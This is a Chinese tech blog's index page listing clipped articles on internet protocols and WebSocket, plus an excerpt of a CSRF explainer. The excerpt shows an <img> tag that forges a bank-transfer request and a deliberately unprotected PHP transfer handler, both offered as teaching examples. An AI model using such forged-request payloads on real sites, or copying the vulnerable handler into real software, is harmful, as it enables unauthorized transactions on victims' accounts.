<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>TLDSN</title>
    <meta name="description" content="^^">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- <script src="https://kit.fontawesome.com/bff30092be.js" crossorigin="anonymous"></script> -->
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1096581_7o3r6v7yzsh.css">
    <link rel="stylesheet" href="/assets/css/main.css ">
    <link rel="canonical" href="https://tldsn.github.io/page2/">
    <link rel="alternate" type="application/rss+xml" title="TLDSN" href="https://tldsn.github.io/feed.xml ">
    <link type="application/atom+xml" rel="alternate" href="https://tldsn.github.io/feed.xml" title="TLDSN" />
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Page 2 of 8 for TLDSN | ^^</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="TLDSN" />
<meta name="author" content="tldsn" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="^^" />
<meta property="og:description" content="^^" />
<link rel="canonical" href="https://tldsn.github.io/page2/" />
<meta property="og:url" content="https://tldsn.github.io/page2/" />
<meta property="og:site_name" content="TLDSN" />
<link rel="prev" href="https://tldsn.github.io/" />
<link rel="next" href="https://tldsn.github.io/page3" />
<script type="application/ld+json">
{"url":"https://tldsn.github.io/page2/","author":{"@type":"Person","name":"tldsn"},"description":"^^","@type":"WebPage","headline":"TLDSN","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ccd4104a124f2218d64c124431d52789";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-163446273-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


<body>

  <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">TLDSN</a>
        <small>太阳升起时，请重新开始</small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collection/">
                        
                            <i class="fa fa-bookmark"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/todo/">
                        
                            <i class="fa fa-check-square-o"></i>Todo
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/note/">
                        
                            <i class="fa fa-code"></i>Note
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-heart"></i>About
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/authors/">
                        
                            <i class="fa fa-"></i>Staff
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


  <div class="page clearfix" index>
    <div class="left">
        <h1>Welcome to TLDSN's Blog!</h1>
        <small></small>
        <hr>
        <ul>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%BA%8C-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">互联网协议入门（二）-阮一峰的网络日志</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-08
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:article">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; position: relative;"> <div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;font-family:Georgia, serif;letter-spacing:-0.01em;word-spacing:0.2em;line-height:1.8em;font-size:62.5%;background-color:rgb(245, 245, 213);color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);background-color:rgb(245, 245, 213);min-width:640px;"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div>
                                    <h1 style="list-style-type:none;text-align:left;text-decoration:none;font-style:normal;border:medium none;font-size:2.88em;letter-spacing:-0.03em;border-bottom:1px solid rgb(211, 211, 211);margin:0.4em 0px 0.2em;padding:0px 0px 0.2em;font-weight:500;color:rgb(0, 0, 0);line-height:250%;font-family:&quot;Trebuchet MS&quot;, Arial, &quot;Lucida Grande&quot;, Verdana, Lucida, Helvetica, sans-serif;">互联网协议入门（二）</h1>
                                            <div style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;border:medium none;color:rgb(17, 17, 17);float:right;padding-right:2em;padding-top:1em;">
<a href="http://www.bshare.cn/share" style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;font:12px / 14px Helvetica, Calibri, Tahoma, Arial, 宋体, sans-serif;border:medium none;overflow:hidden;color:rgb(85, 102, 119);height:21px;line-height:18px;font-size:12px;padding-left:0px;display:block;width:51px;"><div style="list-style-type:none;margin:0px;padding:0px;text-align:center;font-style:normal;text-decoration:none;font-weight:bold;border:medium none;color:#333;display:inline-block;background:transparent url(http://static.bshare.cn/frame/images/button_custom10-zh-Orange.gif) no-repeat;line-height:1.2;cursor:pointer;height:21px;width:51px;"></div><div style="list-style-type:none;text-align:left;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);display:inline-block;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;line-height:1.2;margin:0px;padding:0px;text-decoration:none;border:medium none;clear:both;"></div></a>
                </div>
                <div class="read-all">
                    <a  href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%BA%8C-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%B8%80-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">互联网协议入门（一）-阮一峰的网络日志</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-08
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:article">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; position: relative;"> <div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;font-family:Georgia, serif;letter-spacing:-0.01em;word-spacing:0.2em;line-height:1.8em;font-size:62.5%;background-color:rgb(245, 245, 213);color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);background-color:rgb(245, 245, 213);min-width:640px;"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div>
                                    <h1 style="list-style-type:none;text-align:left;text-decoration:none;font-style:normal;border:medium none;font-size:2.88em;letter-spacing:-0.03em;border-bottom:1px solid rgb(211, 211, 211);margin:0.4em 0px 0.2em;padding:0px 0px 0.2em;font-weight:500;color:rgb(0, 0, 0);line-height:250%;font-family:&quot;Trebuchet MS&quot;, Arial, &quot;Lucida Grande&quot;, Verdana, Lucida, Helvetica, sans-serif;">互联网协议入门（一）</h1>
                                            <div style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;border:medium none;color:rgb(17, 17, 17);float:right;padding-right:2em;padding-top:1em;">
<a href="http://www.bshare.cn/share" style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;font:12px / 14px Helvetica, Calibri, Tahoma, Arial, 宋体, sans-serif;border:medium none;overflow:hidden;color:rgb(85, 102, 119);height:21px;line-height:18px;font-size:12px;padding-left:0px;display:block;width:51px;"><div style="list-style-type:none;margin:0px;padding:0px;text-align:center;font-style:normal;text-decoration:none;font-weight:bold;border:medium none;color:#333;display:inline-block;background:transparent url(http://static.bshare.cn/frame/images/button_custom10-zh-Orange.gif) no-repeat;line-height:1.2;cursor:pointer;height:21px;width:51px;"></div><div style="list-style-type:none;text-align:left;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);display:inline-block;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;line-height:1.2;margin:0px;padding:0px;text-decoration:none;border:medium none;clear:both;"></div></a>
                </div>
                <div class="read-all">
                    <a  href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%B8%80-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/08/WebSocket%E6%95%99%E7%A8%8B-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">WebSocket教程-阮一峰的网络日志</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-08
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <a href="/tag/#websocket" title="Tag: websocket" rel="tag">websocket</a>
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:article">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; position: relative;"> <div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;font-family:Georgia, serif;letter-spacing:-0.01em;word-spacing:0.2em;line-height:1.8em;font-size:62.5%;background-color:rgb(245, 245, 213);color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);background-color:rgb(245, 245, 213);min-width:640px;"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div style="list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);"><div>
                                    <h1 style="list-style-type:none;text-align:left;text-decoration:none;font-style:normal;border:medium none;font-size:2.88em;letter-spacing:-0.03em;border-bottom:1px solid rgb(211, 211, 211);margin:0.4em 0px 0.2em;padding:0px 0px 0.2em;font-weight:500;color:rgb(0, 0, 0);line-height:250%;font-family:&quot;Trebuchet MS&quot;, Arial, &quot;Lucida Grande&quot;, Verdana, Lucida, Helvetica, sans-serif;">WebSocket 教程</h1>
                                            <div style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;border:medium none;color:rgb(17, 17, 17);float:right;padding-right:2em;padding-top:1em;">
<a href="http://www.bshare.cn/share" style="margin:0px;padding:0px;list-style-type:none;text-align:left;text-decoration:none;font-weight:normal;font-style:normal;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;font:12px / 14px Helvetica, Calibri, Tahoma, Arial, 宋体, sans-serif;border:medium none;overflow:hidden;color:rgb(85, 102, 119);height:21px;line-height:18px;font-size:12px;padding-left:0px;display:block;width:51px;"><div style="list-style-type:none;margin:0px;padding:0px;text-align:center;font-style:normal;text-decoration:none;font-weight:bold;border:medium none;color:#333;display:inline-block;background:transparent url(http://static.bshare.cn/frame/images/button_custom10-zh-Orange.gif) no-repeat;line-height:1.2;cursor:pointer;height:21px;width:51px;"></div><div style="list-style-type:none;text-align:left;font-weight:normal;font-style:normal;color:rgb(17, 17, 17);display:inline-block;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0%;line-height:1.2;margin:0px;padding:0px;text-decoration:none;border:medium none;clear:both;"></div></a>
                </div>
                <div class="read-all">
                    <a  href="/2020/07/08/WebSocket%E6%95%99%E7%A8%8B-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/07/%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-hyddd-%E5%8D%9A%E5%AE%A2%E5%9B%AD/">浅谈CSRF攻击方式-hyddd-博客园</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-07
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote">
  <div style="--en-clipped-content:simplified">
<div><br></div><div style="font-size: 16px; display:block; min-width: 100%; "> <div style="background-color:transparent;font:inherit;vertical-align:baseline;"><div style="background-color:transparent;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;font-size:16px;line-height:1.5em;color:rgb(31, 9, 9);text-align:left;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;z-index:200;padding-left:2em;padding-right:2em;margin-left:auto;margin-right:auto;position:relative;width:36em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-left:-25px;margin-right:25px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;padding-top:0px;padding-bottom:9em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;"><h1 style="border:0px none;font:inherit;vertical-align:baseline;font-family:&quot;PT Serif&quot;;text-align:left;font-size:35px;font-weight:normal;line-height:35px;margin-bottom:20px;padding:0px;margin:0px;">浅谈CSRF攻击方式 - hyddd - 博客园</h1><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:relative;height:1em;line-height:1;text-align:center;margin:0px;padding-top:1.5em;padding-bottom:1.5em;margin-bottom:0px;"><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;opacity:0.5;margin:0px;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;margin-bottom:0px;"><span style="font:inherit;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;margin:0px;opacity:0.5;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;"></span></div></div></div>
    <p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">一.CSRF是什么？</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">二.CSRF可以做什么？</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">三.CSRF漏洞现状</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI......而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">四.CSRF的原理</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　下图简单阐述了CSRF攻击的思想：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　</p><div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;display:block;text-align:center;margin-top:1em;margin-bottom:1em;"><img width="576" height="325" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;border-color:rgb(31, 9, 9);display:block;max-width:100%;" src="https://app.yinxiang.com/files/common-services/binary-datas/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiMDc5MDVkMTctNTEzNS00OWM0LWJjNzctYzdiNWEyNzU5YzZhIiwicmVzb3VyY0d1aWQiOiJiZWJhMWMxOC1kMDBhLTRlYTctYTI4OC0zYThkNWYwZjU2OGEifQ==" data-original-width="1052" mime="image/jpeg" data-original-height="593" id="0c63c4193d48b8f42c4a4f53d82330df" class="en-media"></div><p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　1.登录受信任网站A，并在本地生成Cookie。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　2.在不登出A的情况下，访问危险网站B。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了......）</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;）</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">　　示例1：</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　银行网站A，它以GET请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　危险网站B，它里面有一段HTML的代码如下：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　&lt;img&nbsp;src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的&lt;img&gt;以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　<b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">示例2：</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　为了杜绝上面的问题，银行决定改用POST请求完成转账操作。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　银行网站A的WEB表单如下：　　</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　&lt;form&nbsp;action="Transfer.php"&nbsp;method="POST"&gt;　　　　&lt;p&gt;ToBankId:&nbsp;&lt;input&nbsp;type="text"&nbsp;name="toBankId"/&gt;&lt;/p&gt;　　　　&lt;p&gt;Money:&nbsp;&lt;input&nbsp;type="text"&nbsp;name="money"/&gt;&lt;/p&gt;　　　　&lt;p&gt;&lt;input&nbsp;type="submit"&nbsp;value="Transfer"/&gt;&lt;/p&gt;　　&lt;/form&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　后台处理页面Transfer.php如下：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　&lt;?php<br>　　　　session_start();<br>　　　　if&nbsp;(isset($_REQUEST['toBankId']&nbsp;&amp;&amp;isset($_REQUEST['money']))<br>　　　　{<br>　　　　&nbsp;&nbsp;&nbsp; buy_stocks($_REQUEST['toBankId'],$_REQUEST['money']);<br>　　　　}<br>　　?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　危险网站B，仍然只是包含那句HTML代码：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;img&nbsp;src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果.....和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
